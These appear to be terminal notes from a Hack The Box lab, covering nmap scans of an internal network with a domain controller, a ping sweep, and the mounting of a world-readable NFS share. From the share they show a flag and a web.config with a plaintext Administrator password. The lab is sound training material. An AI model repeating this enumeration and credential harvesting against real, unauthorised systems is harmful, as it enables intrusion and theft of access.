TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethfc475d0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet6 fe80::60b9:b7ff:fed7:7983  prefixlen 64  scopeid 0x20<link>
ether 62:b9:b7:d7:79:83  txqueuelen 0  (Ethernet)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 19  bytes 1506 (1.5 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

Nmap scan report for 172.16.8.20
Host is up, received reset ttl 64 (0.071s latency).
Scanned at 2026-06-09 21:52:12 EDT for 222s
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       REASON         VERSION
80/tcp   open  http          syn-ack ttl 64 Microsoft IIS httpd 10.0
111/tcp  open  rpcbind       syn-ack ttl 64 2-4 (RPC #100000)
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 64
2049/tcp open  nlockmgr      syn-ack ttl 64 1-4 (RPC #100021)
3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Nmap scan report for 172.16.8.3
Host is up, received reset ttl 64 (0.074s latency).
Scanned at 2026-06-09 21:52:12 EDT for 182s
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       REASON         VERSION
53/tcp   open  domain        syn-ack ttl 64 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 64 Microsoft Windows Kerberos (server time: 2026-06-10 01:54:28Z)
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 64
464/tcp  open  kpasswd5?     syn-ack ttl 64
593/tcp  open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 64
3268/tcp open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 64
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 172.16.8.50
Host is up, received reset ttl 64 (0.074s latency).
Scanned at 2026-06-09 21:52:12 EDT for 182s
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       REASON         VERSION
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 64
3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp open  http          syn-ack ttl 64 Apache Tomcat (language: en)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 172.16.8.120
Host is up, received reset ttl 64 (0.067s latency).
Scanned at 2026-06-09 21:55:54 EDT for 154s
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE  REASON         VERSION
21/tcp   open  ftp      syn-ack ttl 64 vsftpd 3.0.3
22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     syn-ack ttl 64 Postfix smtpd
53/tcp   open  domain   syn-ack ttl 64 (unknown banner: 1337_HTB_DNS)
80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
110/tcp  open  pop3     syn-ack ttl 64 Dovecot pop3d
111/tcp  open  rpcbind  syn-ack ttl 64 2-4 (RPC #100000)
143/tcp  open  imap     syn-ack ttl 64 Dovecot imapd (Ubuntu)
993/tcp  open  ssl/imap syn-ack ttl 64 Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 syn-ack ttl 64 Dovecot pop3d
8080/tcp open  http     syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))

for i in {1..254}; do ping -c 1 -W 1 172.16.8.$i | grep "64 bytes"; done
64 bytes from 172.16.8.3: icmp_seq=1 ttl=64 time=69.0 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=64 time=69.6 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=64 time=68.1 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=68.3 ms
┌─[✗]─[root@pwnbox7]─[/home/htb-ac-323227]
└──╼ #showmount -e 172.16.8.20
Export list for 172.16.8.20:
/DEV01 (everyone)
┌─[root@pwnbox7]─[/home/htb-ac-323227]
└──╼ #mkdir /tmp/share
┌─[root@pwnbox7]─[/home/htb-ac-323227]
└──╼ #sudo mount -t nfs 172.16.8.20:/DEV01 /tmp/share

└──╼ #cd /tmp/share
┌─[root@pwnbox7]─[/tmp/share]
└──╼ #ls
BuildPackages.bat            CKToolbarSets.xml  WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  DNN
CKToolbarButtons.xml         flag.txt
┌─[root@pwnbox7]─[/tmp/share]
└──╼ #cat flag.txt
bf22a1d0acfca4af517e1417a80e92d1

┌─[root@pwnbox7]─[/tmp/share/DNN]
└──╼ #cat web.config
<?xml version="1.0"?>
<configuration>
<!--
For a description of web.config changes see [http://go.microsoft.com/fwlink/?LinkId=235367](http://go.microsoft.com/fwlink/?LinkId=235367).

```
The following attributes can be set on the <httpRuntime> tag.
  <system.Web>
    <httpRuntime targetFramework="4.6.2" />
  </system.Web>
```

- ->
<username>Administrator</username>
<password>
<value>D0tn31Nuk3R0ck$$@123</value>
</password>
<[system.web](http://system.web/)>
<compilation debug="true" targetFramework="4.5.2"/>
<httpRuntime targetFramework="4.5.2"/>
</system.web>
</configuration>